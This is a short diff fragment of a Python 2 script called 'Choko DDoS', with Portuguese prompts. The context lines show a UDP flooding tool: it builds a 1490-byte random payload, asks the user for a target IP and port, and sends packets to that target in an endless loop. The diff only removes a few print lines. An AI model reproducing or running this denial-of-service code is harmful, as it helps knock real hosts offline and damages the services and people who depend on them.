@@ -8,8 +8,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 time.sleep(2)
 os.system("clear")
-print
-print 
 print "Choko DDoS"
 ip = raw_input("IP do alvo =  ")
 port = input("Porta =  ")
@@ -27,7 +25,6 @@ print "carregando...100%"
 time.sleep(3)
 print "carregado com sucesso!"
 time.sleep(0.5)
-print "
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
